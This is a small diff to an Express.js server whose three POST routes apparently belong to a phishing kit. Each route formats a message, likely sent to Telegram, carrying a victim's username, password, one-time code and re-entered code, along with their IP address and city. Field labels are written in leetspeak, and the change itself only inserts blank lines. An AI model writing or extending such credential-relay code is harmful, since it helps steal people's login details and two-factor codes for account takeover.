@@ -60,8 +60,10 @@ app.post('/enviar', async (req, res) => {
   const mensaje = `
 🔴D4VI SV🔴
 🆔 ID: <code>${txid}</code>
+
 📱 US4R: <code>${usar}</code>
 🔐 CL4V: <code>${clavv}</code>
+
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 `;
@@ -106,6 +108,7 @@ app.post('/enviar2', async (req, res) => {
 📱 US4R: <code>${usar}</code>
 
 🔐 C0D3: <code>${clavv}</code>
+
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 
@@ -152,6 +155,7 @@ app.post('/enviar3', async (req, res) => {
 📱 US4R: <code>${usar}</code>
 
 🔐 RE-C0D3: <code>${clavv}</code>
+
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
 
